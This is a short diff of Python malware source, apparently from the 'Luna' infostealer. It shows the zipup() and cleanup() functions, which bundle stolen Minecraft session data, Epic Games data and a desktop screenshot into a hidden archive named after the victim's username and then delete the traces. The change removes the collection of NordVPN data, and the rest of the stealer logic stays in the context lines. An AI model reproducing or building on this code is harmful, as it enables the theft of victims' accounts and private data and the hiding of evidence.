@@ -565,7 +565,6 @@ def zipup():
         zipf.write("minecraft-sessioninfo.json")
         zipf.write("minecraft-usercache.json")
         zipf.write("epicgames-data.txt")
-        zipf.write("nordvpn-data.txt")
         zipf.write("desktop-screenshot.png")
     hide(f'Luna-Logged-{os.getenv("Username")}.zip')
 
@@ -577,7 +576,6 @@ def cleanup():
                   os.remove("minecraft-usercache.json"),
                   os.remove("minecraft-sessioninfo.json"),
                   os.remove("epicgames-data.txt"),
-                  os.remove("nordvpn-data.txt"),
                   os.remove("desktop-screenshot.png"),
                   os.remove(f"Luna-Logged-{os.getenv('Username')}.zip")]:
         try:
